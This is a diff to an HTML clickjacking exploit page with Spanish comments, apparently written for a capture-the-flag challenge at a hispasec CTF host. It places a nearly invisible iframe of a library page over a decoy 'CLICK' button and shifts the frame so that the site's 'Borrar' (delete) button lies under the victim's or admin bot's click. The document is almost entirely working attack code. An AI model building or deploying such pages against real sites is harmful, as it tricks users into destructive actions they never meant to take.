@@ -2,32 +2,40 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Clickjacking Exploit</title>
+    <title>Exploit</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
 
-        /* Hacemos que el botón ocupe TODA la pantalla */
+        /* El botón que el bot buscará. Lo hacemos gigante. */
         #objetivo {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            z-index: 1; /* Debajo del iframe */
-            opacity: 1;
-            cursor: pointer;
-        }
-
-        iframe {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            border: none;
+            z-index: 1; /* Estará "detrás" pero el bot lo detectará */
+            opacity: 0; /* Invisible para no estorbar visualmente */
+        }
+
+        /* Contenedor del iframe para recortar y ver solo el botón de borrar */
+        .iframe-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             z-index: 2; /* Encima para recibir el clic */
-            /* IMPORTANTE: Usa una opacidad muy baja pero no 0 absoluto */
-            opacity: 0.001; 
+            opacity: 0.0001; /* Casi invisible */
+        }
+
+        iframe {
+            width: 100%;
+            height: 2000px; /* Altura grande para que quepa todo */
+            border: none;
+            /* AJUSTE DE SCROLL: 
+               Este margen negativo "empuja" la página hacia arriba 
+               para que el botón 'Borrar' de la librería aparezca arriba del todo. */
+            margin-top: -700px; 
         }
     </style>
 </head>
@@ -35,7 +43,9 @@
 
     <button id="objetivo">CLICK</button>
 
-    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+    <div class="iframe-container">
+        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+    </div>
 
 </body>
 </html>
